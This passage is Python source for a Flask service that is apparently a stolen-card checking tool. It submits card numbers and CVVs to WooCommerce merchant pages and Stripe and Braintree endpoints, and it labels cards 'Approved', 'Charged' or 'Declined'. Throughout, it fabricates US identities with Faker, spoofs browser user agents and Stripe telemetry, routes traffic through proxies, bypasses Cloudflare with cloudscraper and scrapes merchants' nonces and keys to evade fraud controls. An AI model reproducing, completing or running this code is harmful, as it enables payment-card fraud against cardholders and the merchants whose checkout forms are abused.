import requests
import re
import json
import random
import logging
from flask import Flask, request, jsonify
import time
from lxml import html
import json
from urllib.parse import urlparse
from datetime import datetime, timedelta
from faker import Faker
from functools import wraps
import threading
import uuid
import cloudscraper

app = Flask(__name__)

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)

logger = logging.getLogger(__name__)

# Response messages
APPROVED = '𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙 ✅'
DECLINED = '𝘿𝙚𝙘𝙡𝙞𝙣𝙚𝙙 ❌'
ERROR = '𝙀𝙍𝙍𝙊𝙍 ⚠️'
SUCCESS = '𝙎𝙐𝘾𝘾𝞢𝙎𝙎 ✅'
FAILED = '𝙁𝘼𝙄𝙇𝙀𝘿 ❌'
CHARGE = '𝘾𝙃𝘼𝙍𝙂𝙀𝘿 ✅'
INSUFFICIENT_FUNDS = '𝙄𝙣𝙨𝙪𝙛𝙛𝙞𝙘𝙞𝙚𝙣𝙩 𝙁𝙪𝙣𝙙𝙨 ☑️'
PASSAD = '𝙋𝘼𝙎𝙎𝙀𝘿 ❎'

# Configuration
REQUEST_TIMEOUT = 30  # Reduced from 60 to optimize performance while maintaining reliability
CACHE_EXPIRY = timedelta(minutes=1)

fake = Faker("en_US")
DOMAINS = ["gmail.com", "yahoo.com", "hotmail.com", "outlook.com"]

# Cache for geographic data
geo_data_cache = {
    'data': None,
    'last_updated': None
}

def validate_input(func):
    """Decorator to validate input parameters"""
    @wraps(func)
    def wrapper(*args, **kwargs):
        try:
            return func(*args, **kwargs)
        except Exception as e:
            logger.error(f"Validation error in {func.__name__}: {str(e)}")
            return None
    return wrapper

def generate_fake_user_agent():
    """Generate a realistic random User-Agent"""
    versions = [
        "137.0.0.0", "138.0.0.0", "139.0.0.0", "140.0.0.0", 
        "141.0.0.0", "142.0.0.0", "143.0.0.0"
    ]
    android_versions = [10, 11, 12, 13, 14]
    devices = ["SM-G991B", "SM-G998B", "Pixel 6", "Pixel 7", "Mi 11"]
    
    return f"Mozilla/5.0 (Linux; Android {random.choice(android_versions)}; {random.choice(devices)}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.choice(versions)} Mobile Safari/537.36"

def fetch_city_zipcode_data():
    """Fetch US geographic data from GitHub repository with caching"""
    now = datetime.now()
    
    if (geo_data_cache['data'] is not None and 
        geo_data_cache['last_updated'] is not None and
        (now - geo_data_cache['last_updated']) < CACHE_EXPIRY):
        return geo_data_cache['data']
    
    url = "https://raw.githubusercontent.com/ANYA-LZ/country-map/refs/heads/main/US.json"
    try:
        response = requests.get(url, timeout=8)  # Further reduced timeout for geo data
        response.raise_for_status()
        geo_data = response.json()
        
        geo_data_cache['data'] = geo_data
        geo_data_cache['last_updated'] = now
        
        return geo_data
    except requests.RequestException as e:
        logger.error(f"Failed to fetch geographic data: {str(e)}")
        # Return a fallback dataset to avoid complete failure
        fallback_data = {
            "CA": {"Los Angeles": "90210", "San Francisco": "94102"},
            "NY": {"New York": "10001", "Albany": "12201"},
            "TX": {"Houston": "77001", "Dallas": "75201"},
            "FL": {"Miami": "33101", "Tampa": "33601"}
        }
        return fallback_data

@validate_input
def generate_random_person():
    """Generate realistic US resident profile"""
    geo_data = fetch_city_zipcode_data()
    if not geo_data:
        logger.error("No geographic data available")
        return None

    state = random.choice(list(geo_data.keys()))
    city = random.choice(list(geo_data[state].keys()))
    zipcode = geo_data[state][city]

    return {
        'first_name': fake.first_name(),
        'last_name': fake.last_name(),
        'email': f"{fake.user_name()[:10]}@{random.choice(DOMAINS)}".lower(),
        'phone': _format_phone_number(zipcode),
        'address': fake.street_address(),
        'city': city,
        'state': state,
        'zipcode': zipcode,
        'country': "United States",
        'user_agent': generate_fake_user_agent(),
    }

def _format_phone_number(zipcode):
    """Format phone number with area code matching zipcode"""
    base_num = fake.numerify("###-###-####")
    return f"({zipcode[:3]}) {base_num}"

def parse_proxy(proxy_string):
    """
    Parse proxy string in various formats and return properly formatted proxy URL.
    
    Supported formats:
    - host:port:username:password (most common)
    - username:password@host:port
    - host:port (no auth)
    - http://host:port
    - http://username:password@host:port
    - socks5://host:port
    - socks5://username:password@host:port
    """
    if not proxy_string:
        return None
    
    proxy_string = proxy_string.strip()
    
    # If already in URL format (starts with http://, https://, socks4://, socks5://)
    if proxy_string.startswith(('http://', 'https://', 'socks4://', 'socks5://')):
        return proxy_string
    
    # Check if it's in format username:password@host:port
    if '@' in proxy_string:
        # Already has @ format, just add http:// prefix
        return f"http://{proxy_string}"
    
    parts = proxy_string.split(':')
    
    if len(parts) == 2:
        # Format: host:port (no authentication)
        host, port = parts
        return f"http://{host}:{port}"
    
    elif len(parts) == 4:
        # Format: host:port:username:password
        host, port, username, password = parts
        return f"http://{username}:{password}@{host}:{port}"
    
    elif len(parts) == 3:
        # Could be host:port:username (incomplete) - treat as invalid
        # Or could be ip:port:port (invalid)
        logger.warning(f"Invalid proxy format with 3 parts: {proxy_string}")
        return None
    
    else:
        logger.warning(f"Unrecognized proxy format: {proxy_string}")
        return None

def get_proxy_dict(gateway_config):
    """
    Get proxy dictionary from gateway_config.
    Returns None if no proxy or invalid proxy.
    """
    if 'proxy' not in gateway_config or not gateway_config['proxy']:
        return None
    
    proxy_url = parse_proxy(gateway_config['proxy'])
    if not proxy_url:
        return None
    
    return {'http': proxy_url, 'https': proxy_url}

def is_proxy_error(exception):
    """
    Check if the exception is related to proxy issues.
    Returns tuple (is_proxy_error, error_message)
    """
    error_str = str(exception).lower()
    
    # Check for ProxyError
    if 'proxyerror' in type(exception).__name__.lower():
        return True, "Proxy connection failed"
    
    # Check for common proxy-related error messages
    proxy_indicators = [
        'proxy',
        'tunnel',
        'cannot connect to proxy',
        'proxy authentication required',
        '407',  # Proxy Authentication Required
        'socks',
        'connection refused',
        'connection reset',
        'connection aborted',
        'unable to connect',
        'max retries exceeded',
        'newconnectionerror',
        'proxyconnectionerror',
    ]
    
    for indicator in proxy_indicators:
        if indicator in error_str:
            if 'authentication' in error_str or '407' in error_str:
                return True, "Proxy authentication failed"
            elif 'refused' in error_str:
                return True, "Proxy connection refused"
            elif 'timeout' in error_str:
                return True, "Proxy connection timeout"
            elif 'reset' in error_str or 'aborted' in error_str:
                return True, "Proxy connection reset"
            else:
                return True, "Proxy error"
    
    # Check for connection timeout which might be proxy-related
    if 'connecttimeout' in type(exception).__name__.lower():
        return True, "Proxy connection timeout"
    
    return False, None

def generate_cookies(gateway_config):
    cookies_list = gateway_config.get("cookies", [])
    cookies_dict = {}
    for cookie in cookies_list:
        if 'name' not in cookie or 'value' not in cookie:
            logger.error("Invalid cookie format")
            return ERROR, "Invalid cookie format"
        cookies_dict[cookie["name"]] = cookie["value"]

    return cookies_dict

def create_new_session(gateway_config, random_person):
    parsed_url = urlparse(gateway_config['url'])
    origin = f"{parsed_url.scheme}://{parsed_url.netloc}"
    """Create a new session with random data"""

    if gateway_config.get('bypass_cloudscraper', False):
        session = cloudscraper.create_scraper()
    else:
        session = requests.Session()

    # Set proxy if provided in gateway_config
    using_proxy = False
    proxy_url = None
    if 'proxy' in gateway_config and gateway_config['proxy']:
        proxy_url = parse_proxy(gateway_config['proxy'])
        if proxy_url:
            session.proxies = {
                'http': proxy_url,
                'https': proxy_url
            }
            using_proxy = True
            logger.info(f"Using proxy: {proxy_url}")

    headers = {
        'User-Agent': random_person['user_agent'],
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9,ar;q=0.8',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'Cache-Control': 'max-age=0',
        'Origin': origin,
        'Referer': gateway_config['url'],
    }
    
    # Update headers with random data
    session.headers.update(headers)

    try:
        response = session.get(
                url=origin,
                timeout=REQUEST_TIMEOUT
            )
        
        response.raise_for_status()
        
        if response.status_code != 200:
            logger.error(f"Failed to fetch initial page, status code: {response.status_code}")

        session.cookies.update(response.cookies)
        
        if "cookies" in gateway_config and "without_cookies" not in gateway_config.get('version', '').lower():
            session.cookies.update(generate_cookies(gateway_config))

        return session
    
    except Exception as e:
        # Check if it's a proxy error
        is_proxy_err, proxy_msg = is_proxy_error(e)
        if is_proxy_err or using_proxy:
            error_type = categorize_proxy_error(e)
            logger.error(f"Proxy error during session creation: {error_type}")
            raise ProxyConnectionError(error_type)
        else:
            raise


class ProxyConnectionError(Exception):
    """Custom exception for proxy-related errors"""
    def __init__(self, message):
        self.message = message
        super().__init__(self.message)


def categorize_proxy_error(exception):
    """Categorize proxy errors into user-friendly messages"""
    error_str = str(exception).lower()
    
    # Check specific causes first (more specific to less specific)
    if 'remotedisconnected' in error_str or 'remote end closed' in error_str:
        return "Proxy Disconnected"
    elif 'closed connection' in error_str:
        return "Proxy Connection Closed"
    elif 'timeout' in error_str or 'timed out' in error_str:
        return "Proxy Timeout"
    elif 'refused' in error_str:
        return "Proxy Refused"
    elif 'reset' in error_str or 'aborted' in error_str:
        return "Proxy Reset"
    elif 'authentication' in error_str or '407' in error_str:
        return "Proxy Auth Failed"
    elif 'unable to connect to proxy' in error_str:
        return "Proxy Unreachable"
    elif 'socks' in error_str:
        return "SOCKS Proxy Error"
    elif 'tunnel' in error_str:
        return "Proxy Tunnel Failed"
    elif 'max retries' in error_str:
        return "Proxy Failed"
    else:
        return "Proxy Error"

class SessionManager:
    """Manages separate sessions for each request to prevent mixing between requests"""
    
    def __init__(self):
        self.sessions = {}  # Dictionary to store request_id -> session mapping
        self.session_timestamps = {}  # Track session creation time for cleanup
        self.max_session_age = timedelta(minutes=0.5)  # Sessions expire after 0.5 minutes
        self.lock = threading.Lock()  # Thread lock for thread safety

    def create_request_id(self):
        """Create a unique request ID for each payment request"""
        return f"req_{uuid.uuid4().hex[:12]}_{int(time.time())}"
    
    def get_session(self, request_id, gateway_config, random_person):
        """Get or create a session for the specific request ID"""
        with self.lock:  # Ensure thread safety
            # Clean up old sessions first
            self._cleanup_old_sessions()
            
            # Always create a new session for each request to ensure complete isolation
            logger.info(f"Creating new session for request ID: {request_id}")
            session = create_new_session(gateway_config, random_person)
            self.sessions[request_id] = session
            self.session_timestamps[request_id] = datetime.now()
            
            return session
    
    def cleanup_session(self, request_id):
        """Remove a specific session from memory"""
        with self.lock:  # Ensure thread safety
            if request_id in self.sessions:
                logger.info(f"Cleaning up session for request ID: {request_id}")
                try:
                    self.sessions[request_id].close()  # Close the session properly
                except Exception as e:
                    logger.warning(f"Error closing session {request_id}: {str(e)}")
                
                del self.sessions[request_id]
                if request_id in self.session_timestamps:
                    del self.session_timestamps[request_id]
    
    def _cleanup_old_sessions(self):
        """Remove sessions that are older than max_session_age"""
        current_time = datetime.now()
        sessions_to_remove = []
        
        for request_id, timestamp in self.session_timestamps.items():
            if current_time - timestamp > self.max_session_age:
                sessions_to_remove.append(request_id)
        
        for request_id in sessions_to_remove:
            logger.info(f"Removing expired session: {request_id}")
            if request_id in self.sessions:
                try:
                    self.sessions[request_id].close()
                except Exception as e:
                    logger.warning(f"Error closing expired session {request_id}: {str(e)}")
                del self.sessions[request_id]
            if request_id in self.session_timestamps:
                del self.session_timestamps[request_id]
    
    def get_active_sessions_count(self):
        """Get the count of currently active sessions for monitoring"""
        with self.lock:
            return len(self.sessions)

# Global session manager instance
session_manager = SessionManager()

def get_session(request_id, gateway_config, random_person):
    """Get a session specific to the request ID to prevent mixing between requests"""
    return session_manager.get_session(request_id, gateway_config, random_person)

def extract_payment_config(request_id, card_number, random_person, gateway_config, session):
    result = {
        'nonce': None,
        'pk_live': None,
        'accountId': None,
        'createSetupIntentNonce': None,
        'email': None,
        'ApiKey': None,
        'widgetId': None
    }
    
    try:
        response = session.get(
            gateway_config['url'],
            timeout=REQUEST_TIMEOUT
        )

        response.raise_for_status()

        # Important for next requests
        session.cookies.update(response.cookies)

        # Parse HTML
        tree = html.fromstring(response.content)

        # Extract WooCommerce nonce
        nonce = tree.xpath('//input[@id="woocommerce-add-payment-method-nonce"]/@value')
        result['nonce'] = nonce[0] if nonce else None

        # Read entire HTML as text
        script_content = response.text
        
        # Regex for Stripe keys and config
        result['pk_live'] = re.search(r'"publishableKey":"(pk_live_[^"]+)"', script_content).group(1) \
                            if re.search(r'"publishableKey":"(pk_live_[^"]+)"', script_content) else None

        result['accountId'] = re.search(r'"accountId":"(acct_[^"]+)"', script_content).group(1) \
                              if re.search(r'"accountId":"(acct_[^"]+)"', script_content) else None

        result['createSetupIntentNonce'] = re.search(r'"createSetupIntentNonce":"([^"]+)"', script_content).group(1) \
                                           if re.search(r'"createSetupIntentNonce":"([^"]+)"', script_content) else None
        
        result['email'] = re.search(r'"email":"([^"]+)"', script_content).group(1) \
                          if re.search(r'"email":"([^"]+)"', script_content) else None
        
        # Extract ApiKey with more flexible pattern
        apikey_match = re.search(r'ApiKey=([^"&\s]+)', script_content)
        if apikey_match:
            result['ApiKey'] = apikey_match.group(1)
        else:
            result['ApiKey'] = None
        
        # Extract WidgetId with multiple pattern attempts
        widget_id_match = re.search(r'WidgetId=([^"&\s]+)', script_content)
        if not widget_id_match:
            widget_id_match = re.search(r'Widget ID:\s*([^"&\s]+)', script_content)
        
        if widget_id_match:
            result['widgetId'] = widget_id_match.group(1)
        else:
            result['widgetId'] = None

        return result

    except requests.RequestException as e:
        # Check if it's a proxy error
        is_proxy_err, proxy_msg = is_proxy_error(e)
        if is_proxy_err:
            error_message = categorize_proxy_error(e)
            logging.error(f"Proxy error in extract_payment_config: {error_message}")
            result['proxy_error'] = error_message
            return result
        logging.error(f"Request failed: {str(e)}")
        return result

    except Exception as e:
        logging.error(f"Unexpected error: {str(e)}")
        return result
    
@validate_input
def get_stripe_auth_id(random_person, card_info, publishable_key, account_id, url, gateway_config=None):
    """Generate payment token through Braintree API"""
    parsed_url = urlparse(url)
    origin = f"{parsed_url.scheme}://{parsed_url.netloc}"
    if not isinstance(random_person, dict) or 'zipcode' not in random_person:
        logger.error("Invalid random_person parameter")
        return None, None

    formatted_card_number = ' '.join([card_info['number'][i:i+4] for i in range(0, len(card_info['number']), 4)])
    year_short = str(card_info['year'])[-2:]

    time_on_page = str(random.randint(120000, 240000))

    headers = {
        'User-Agent': random_person['user_agent'],
        'Accept': "application/json",
        'sec-ch-ua-mobile': "?1",
        'origin': "https://js.stripe.com",
        'referer': "https://js.stripe.com/"
    }

    payload = {
        'type': "card",
        'billing_details[name]': f"{random_person['first_name']} {random_person['last_name']}",
        'card[number]': card_info['number'],
        'card[cvc]': card_info['cvv'],
        'card[exp_month]': card_info['month'],
        'card[exp_year]': year_short,
        'guid': str(fake.uuid4()),
        'muid': str(fake.uuid4()),
        'sid': str(fake.uuid4()),
        'payment_user_agent': f"stripe.js/{random.randint(280000000, 290000000)}; stripe-js-v3/{random.randint(280000000, 290000000)}; card-element",
        'referrer': origin,
        'time_on_page': time_on_page,
        'client_attribution_metadata[client_session_id]': str(fake.uuid4()),
        'client_attribution_metadata[merchant_integration_source]': "elements",
        'client_attribution_metadata[merchant_integration_subtype]': "card-element",
        'client_attribution_metadata[merchant_integration_version]': "2017",
        'key': publishable_key,
        '_stripe_account': account_id
    }

    # Set proxy if provided
    proxies = get_proxy_dict(gateway_config) if gateway_config else None

    try:
        response = requests.post(
            'https://api.stripe.com/v1/payment_methods',
            headers=headers,
            data=payload,
            timeout=REQUEST_TIMEOUT,
            proxies=proxies
        )
        response.raise_for_status()
        response_data = response.json()
        
        payment_id = response_data.get('id')
        if not payment_id:
            return False
        return payment_id
        
    except requests.RequestException as e:
        # Check if it's a proxy error
        is_proxy_err, proxy_msg = is_proxy_error(e)
        if is_proxy_err:
            error_message = categorize_proxy_error(e)
            logger.error(f"Proxy error in get_stripe_auth_id: {error_message}")
            return f"PROXY_ERROR:{error_message}"
        logger.error(f"Request failed in get_token: {str(e)}")
        return False
    except (KeyError, ValueError) as e:
        logger.error(f"Invalid response data: {str(e)}")
        return False
    
def get_stripe_charge_v1_info(apikey, widget_id, random_person, gateway_config):
    url = f"https://api.{gateway_config["help_1_url"]}/v1/Widget/{widget_id}?ApiKey={apikey}"

    payload = {
        "ServedSecurely": True,
        "FormUrl": f"https://crm.{gateway_config["help_1_url"]}/HostedDonation?ApiKey={apikey}&WidgetId={widget_id}",
        "Logs": []
    }

    headers = {
        'User-Agent': random_person['user_agent'],
        'Content-Type': "application/json",
        'sec-ch-ua': "\"Chromium\";v=\"142\", \"Brave\";v=\"142\", \"Not_A Brand\";v=\"99\"",
        'content-type': "application/json; charset=UTF-8",
        'sec-ch-ua-mobile': "?1",
        'sec-gpc': "1",
        'accept-language': "en-US,en;q=0.8",
        'origin': f"https://crm.{gateway_config["help_1_url"]}",
        'sec-fetch-site': "same-site",
        'sec-fetch-mode': "cors",
        'sec-fetch-dest': "empty",
        'referer': f"https://crm.{gateway_config["help_1_url"]}/",
        'priority': "u=1, i"
    }

    # Initialize result before try block to ensure it's available in except blocks
    result = {
        'PaymentIntentId': None,
        'ClientSecret': None,
        'pk_live': None
    }

    # Set proxy if provided
    proxies = get_proxy_dict(gateway_config)

    try:
        response = requests.post(url, data=json.dumps(payload), headers=headers, timeout=REQUEST_TIMEOUT, proxies=proxies)
        response.raise_for_status()
        json_response = response.json()
        payment_element = json_response.get("PaymentElement", {})
        if payment_element:
            result['PaymentIntentId'] = payment_element.get("PaymentIntentId")
            result['ClientSecret'] = payment_element.get("ClientSecret")
            # Extract pk_live from the response text
            pk_live_match = re.search(r'pk_live_[A-Za-z0-9]+', response.text)
            if pk_live_match:
                result['pk_live'] = pk_live_match.group(0)

        return result
    
    except requests.RequestException as e:
        # Check if it's a proxy error
        is_proxy_err, proxy_msg = is_proxy_error(e)
        if is_proxy_err:
            error_message = categorize_proxy_error(e)
            logger.error(f"Proxy error in get_stripe_charge_v1_info: {error_message}")
            result['proxy_error'] = error_message
            return result
        logger.error(f"Request failed in get_token: {str(e)}")
        return result
    except (KeyError, ValueError) as e:
        logger.error(f"Invalid response data: {str(e)}")
        return result
    
@validate_input
def get_bar_auth_token(payload, card_info, random_person, access_token, gateway_config=None):
    """Generate payment token through Braintree API"""
    
    if not isinstance(random_person, dict) or 'zipcode' not in random_person:
        logger.error("Invalid random_person parameter")
        return None, None

    headers = {
        'Authorization': f'Bearer {access_token}',
        'braintree-version': '2018-05-10',
        'Content-Type': 'application/json',
    }

    # Set proxy if provided
    proxies = get_proxy_dict(gateway_config) if gateway_config else None

    try:
        response = requests.post(
            'https://payments.braintree-api.com/graphql',
            headers=headers,
            json=payload,
            timeout=REQUEST_TIMEOUT,
            proxies=proxies
        )
        response.raise_for_status()
        response_data = response.json()
        
        # Validate response structure
        if not response_data.get('data', {}).get('tokenizeCreditCard'):
            logger.error("Unexpected response structure from Braintree API")
            return None, None
            
        token_data = response_data['data']['tokenizeCreditCard']
        brandCode = token_data['creditCard']['brandCode']
        token = token_data['token']
        return token, brandCode
        
    except requests.RequestException as e:
        # Check if it's a proxy error
        is_proxy_err, proxy_msg = is_proxy_error(e)
        if is_proxy_err:
            error_message = categorize_proxy_error(e)
            logger.error(f"Proxy error in get_bar_auth_token: {error_message}")
            return f"PROXY_ERROR:{error_message}", None
        logger.error(f"Request failed in get_token: {str(e)}")
        return None, None
    except (KeyError, ValueError) as e:
        logger.error(f"Invalid response data: {str(e)}")
        return None, None

def get_payload_bar_auth_info_v2(auth_token, gateway_config=None):

    url = "https://payments.braintree-api.com/graphql"
    
    # GraphQL query payload
    payload = {
        "clientSdkMetadata": {
            "source": "client",
            "integration": "custom",
            "sessionId": str(fake.uuid4())
        },
        "query": "query ClientConfiguration { clientConfiguration { analyticsUrl environment merchantId assetsUrl clientApiUrl creditCard { supportedCardBrands challenges threeDSecureEnabled threeDSecure { cardinalAuthenticationJWT } } applePayWeb { countryCode currencyCode merchantIdentifier supportedCardBrands } paypal { displayName clientId assetsUrl environment environmentNoNetwork unvettedMerchant braintreeClientId billingAgreementsEnabled merchantAccountId currencyCode payeeEmail } supportedFeatures } }",
        "operationName": "ClientConfiguration"
    }

    headers = {
        "Authorization": f"Bearer {auth_token}",
        "braintree-version": "2018-05-10",
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
    }

    # Set proxy if provided
    proxies = get_proxy_dict(gateway_config) if gateway_config else None

    try:
        response = requests.post(
            url,
            json=payload,
            headers=headers,
            timeout=15,  # Increased from 10 to 15 seconds
            proxies=proxies
        )

        # Check for HTTP errors
        response.raise_for_status()

        # Parse JSON response
        config_data = response.json()

        # Validate response structure
        if "data" not in config_data or "clientConfiguration" not in config_data["data"]:
            raise ValueError("Invalid response structure from Braintree API")

        return config_data["data"]["clientConfiguration"]

    except requests.exceptions.RequestException as e:
        # Check if it's a proxy error
        is_proxy_err, proxy_msg = is_proxy_error(e)
        if is_proxy_err:
            error_message = categorize_proxy_error(e)
            logger.error(f"Proxy error in get_payload_bar_auth_info_v2: {error_message}")
            return f"PROXY_ERROR:{error_message}"
        print(f"Request failed: {str(e)}")
        return None
    except json.JSONDecodeError as e:
        print(f"Failed to parse JSON response: {str(e)}")
        return None
    except ValueError as e:
        print(f"Invalid response data: {str(e)}")
        return None

def generate_payload_payment(request_id, card_number, random_person, gateway_config, card_info, session):
    secrets = extract_payment_config(request_id, card_number, random_person, gateway_config, session=session)

    # Check for proxy error in secrets
    if secrets.get('proxy_error'):
        return False, secrets['proxy_error'], None

    # Initialize info to None as it may not be set in all branches
    info = None

    # Corrected the typo from 'gataway_type' to 'gateway_type'
    if "Braintree Auth" in gateway_config['gateway_type']:
        
        if "v1_with_cookies" in gateway_config['version']:
            required_gateway_fields = ['cookies', 'url', 'access_token', 'success_message', 'error_message', 'post_url']
            for field in required_gateway_fields:
                if field not in gateway_config:
                    logger.error(f"Missing required field in gateway config: {field}")
                    return False, f"{field} is missing in gateway config", None
            if not (nonce := secrets.get('nonce')):
                logger.error("Failed to fetch nonce")
                return False, "Failed to fetch nonce", None
            
            payload_auth = {
                "clientSdkMetadata": {
                    "source": "client",
                    "integration": "custom",
                    "sessionId": fake.uuid4()
                },
                "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }",
                "variables": {
                    "input": {
                    "creditCard": {
                        "number": card_info['number'],
                        "expirationMonth": card_info['month'],
                        "expirationYear": card_info['year'],
                        "cvv": card_info['cvv']
                    },
                    "options": {
                        "validate": False
                    }
                    }
                },
                "operationName": "TokenizeCreditCard"
            }
            
            token, brandCode = get_bar_auth_token(
                payload_auth,
                card_info,
                random_person,
                gateway_config["access_token"],
                gateway_config
            )

            # Check for proxy error
            if isinstance(token, str) and token.startswith("PROXY_ERROR:"):
                proxy_msg = token.replace("PROXY_ERROR:", "")
                return False, proxy_msg, None

            if not token or not brandCode:
                logger.error("Failed to get token or brand code")
                return False, "Failed to fetch token or brand code", None
            
            payload = {
                'payment_method': "braintree_credit_card",
                'wc-braintree-credit-card-card-type': brandCode,
                'wc-braintree-credit-card-3d-secure-enabled': "",
                'wc-braintree-credit-card-3d-secure-verified': "",
                'wc-braintree-credit-card-3d-secure-order-total': "0.00",
                'wc_braintree_credit_card_payment_nonce': token,
                'wc_braintree_device_data': json.dumps({"correlation_id": str(fake.uuid4())}),
                'wc-braintree-credit-card-tokenize-payment-method': "true",
                'woocommerce-add-payment-method-nonce': nonce,
                '_wp_http_referer': "/my-account/add-payment-method",
                'woocommerce_add_payment_method': "1"
            }
        
        elif "v3_with_cookies" in gateway_config['version']:
            required_gateway_fields = ['cookies', 'url', 'access_token', 'success_message', 'error_message']
            for field in required_gateway_fields:
                if field not in gateway_config:
                    logger.error(f"Missing required field in gateway config: {field}")
                    return False, f"{field} is missing in gateway config", None
            payload_auth = {
                "clientSdkMetadata": {
                    "source": "client",
                    "integration": "custom",
                    "sessionId": fake.uuid4()
                },
                "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }",
                "variables": {
                    "input": {
                    "creditCard": {
                        "number": card_info['number'],
                        "expirationMonth": card_info['month'],
                        "expirationYear": card_info['year'],
                        "cvv": card_info['cvv'],
                        "billingAddress": {
                        "postalCode": random_person['zipcode'],
                        "streetAddress": ""
                        }
                    },
                    "options": {
                        "validate": False
                    }
                    }
                },
                "operationName": "TokenizeCreditCard"
            }
            
            token, brandCode = get_bar_auth_token(
                payload_auth,
                card_info,
                random_person,
                gateway_config["access_token"],
                gateway_config
            )

            # Check for proxy error
            if isinstance(token, str) and token.startswith("PROXY_ERROR:"):
                proxy_msg = token.replace("PROXY_ERROR:", "")
                return False, proxy_msg, None

            if not token or not brandCode:
                logger.error("Failed to get token or brand code")
                return False, "Failed to fetch token or brand code", None
            
            payload_config = get_payload_bar_auth_info_v2(gateway_config["access_token"], gateway_config)
            
            # Check for proxy error in payload_config
            if isinstance(payload_config, str) and payload_config.startswith("PROXY_ERROR:"):
                proxy_msg = payload_config.replace("PROXY_ERROR:", "")
                return False, proxy_msg, None
            
            if not payload_config:
                logger.error("Failed to get Braintree Auth payload info v2")
                return False, "Failed to get Braintree Auth payload info v2", None
            
            if not (nonce := secrets.get('nonce')):
                logger.error("Failed to fetch nonce")
                return False, "Failed to fetch nonce", None
            
            config_data = {
                "environment": payload_config["environment"],
                "clientApiUrl": payload_config["clientApiUrl"],
                "assetsUrl": payload_config["assetsUrl"],
                "merchantId": payload_config["merchantId"],
                "analytics": {"url": payload_config["analyticsUrl"]},
                "creditCards": {
                    "supportedCardTypes": payload_config["creditCard"]["supportedCardBrands"]
                },
                "challenges": payload_config["creditCard"]["challenges"],
                "threeDSecureEnabled": payload_config["creditCard"]["threeDSecureEnabled"],
                "paypal": payload_config["paypal"],
                "applePayWeb": payload_config["applePayWeb"]
            }
        
            payload = {
                "payment_method": "braintree_cc",
                "braintree_cc_nonce_key": token,
                "braintree_cc_device_data": json.dumps({
                    "device_session_id": str(fake.uuid4()),
                    "correlation_id": str(fake.uuid4())
                }),
                "braintree_cc_config_data": json.dumps(config_data),
                "woocommerce-add-payment-method-nonce": nonce,
                "_wp_http_referer": "/my-account/add-payment-method/",
                "woocommerce_add_payment_method": "1"
            }

    elif "Stripe Auth" in gateway_config['gateway_type']:
        if "v1_with_cookie" in gateway_config['version']:
            required_gateway_fields = ['cookies', 'url', 'post_url']
            for field in required_gateway_fields:
                if field not in gateway_config:
                    logger.error(f"Missing required field in gateway config: {field}")
                    return False, f"{field} is missing in gateway config", None

            if not (pk_live := secrets.get('pk_live')):
                logger.error("Failed to fetch pk live")
                return False, "Failed to fetch pk live", None
            
            if not (accountId := secrets.get('accountId')):
                logger.error("Failed to fetch accountId")
                return False, "Failed to fetch accountId", None
            
            if not (email := secrets.get('email')):
                logger.error("Failed to fetch email")
                return False, "Failed to fetch email", None
            
            if not (payment_id := get_stripe_auth_id(random_person, card_info, pk_live, accountId, gateway_config['url'], gateway_config)):
                logger.error("Failed to fetch ID")
                return False, "Your card was rejected from the gateway", None
            
            # Check for proxy error
            if isinstance(payment_id, str) and payment_id.startswith("PROXY_ERROR:"):
                proxy_msg = payment_id.replace("PROXY_ERROR:", "")
                return False, proxy_msg, None
            
            if not (ajax_nonce := secrets.get('createSetupIntentNonce')):
                logger.error("Failed to fetch ajax nonce")
                return False, "Failed to fetch ajax nonce", None
            
            payload = {
                'action': 'create_setup_intent',
                'wcpay-payment-method': payment_id,
                '_ajax_nonce': ajax_nonce
            }

    elif "Stripe Charge" in gateway_config['gateway_type']:
        if "v1_without_cookies" in gateway_config['version']:
            required_gateway_fields = ['url', 'post_url']
            for field in required_gateway_fields:
                if field not in gateway_config:
                    logger.error(f"Missing required field in gateway config: {field}")
                    return False, f"{field} is missing in gateway config", None
                
            if not (api_key := secrets.get('ApiKey')):
                logger.error("Failed to fetch ApiKey")
                return False, "Failed to fetch ApiKey", None
            
            if not (widget_id := secrets.get('widgetId')):
                logger.error("Failed to fetch widgetId")
                return False, "Failed to fetch widgetId", None
            
            payment_info = get_stripe_charge_v1_info(api_key, widget_id, random_person, gateway_config)
            
            # Check for proxy error
            if payment_info.get('proxy_error'):
                return False, payment_info['proxy_error'], None
            
            if not (Payment_intent_id := payment_info.get('PaymentIntentId')):
                logger.error("Failed to fetch PaymentIntentId")
                return False, "Failed to fetch PaymentIntentId", None
            
            if not (Client_secret := payment_info.get('ClientSecret')):
                logger.error("Failed to fetch ClientSecret")
                return False, "Failed to fetch ClientSecret", None
            
            if not (pk_live := payment_info.get('pk_live')):
                logger.error("Failed to fetch pk_live")
                return False, "Failed to fetch pk_live", None
            
            payload = {
                'return_url': f"https://crm.{gateway_config["help_1_url"]}/HostedDonation?ApiKey={api_key}&WidgetId={widget_id}",
                'payment_method_data[billing_details][address][country]': "US",
                'payment_method_data[billing_details][address][postal_code]': "10001",
                'payment_method_data[type]': "card",
                'payment_method_data[card][number]': card_info['number'],
                'payment_method_data[card][cvc]': card_info['cvv'],
                'payment_method_data[card][exp_year]': card_info['year'],
                'payment_method_data[card][exp_month]': card_info['month'],
                'payment_method_data[allow_redisplay]': "unspecified",
